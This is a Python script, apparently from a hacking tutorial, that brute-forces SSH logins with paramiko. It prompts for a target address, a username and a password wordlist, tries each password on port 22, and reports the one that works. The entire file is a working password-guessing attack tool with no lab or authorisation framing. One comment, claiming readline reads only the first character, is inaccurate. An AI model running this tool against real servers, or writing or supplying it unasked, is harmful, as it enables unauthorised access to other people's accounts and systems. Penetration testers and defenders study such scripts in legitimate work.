# These are the libraries that we are going to need
import paramiko, sys, os, socket, termcolor

def new_line():
    print('\n')

def ssh_connect(password, code=0):

    # These are two standard lines we need before we try to connect
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # This is where we are trying to connect to our target with the supplied username, password comes from wordlist.  
    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1

    except socket.error as e:
        code = 2
        print(e)

    except KeyboardInterrupt:
        print(' User Ended')

    ssh.close()
    return code

# We first need 3 things from the user
# Target, Username to attack, and passwords file
host = input('[+] Please enter the target address: ')
username = input('[+] Please enter SSH username: ')
input_file = input('[+] Please enter password file: ')
new_line()

# Check to make sure valid passwords file
if os.path.exists(input_file) == False:
    print('[!] That Path/File does not exist!')
    sys.exit(1)

# Must use readlineS with S, LINES, as readline will only read the first char
with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(f'[+] Found Password: {password} for account: {username}')
                break
            elif response == 1:
                print(f'[-] Incorrect Login: {password}')
            elif response == 2:
                print('[!] Cannot Connect')
        except Exception as e:
            print(e)
            pass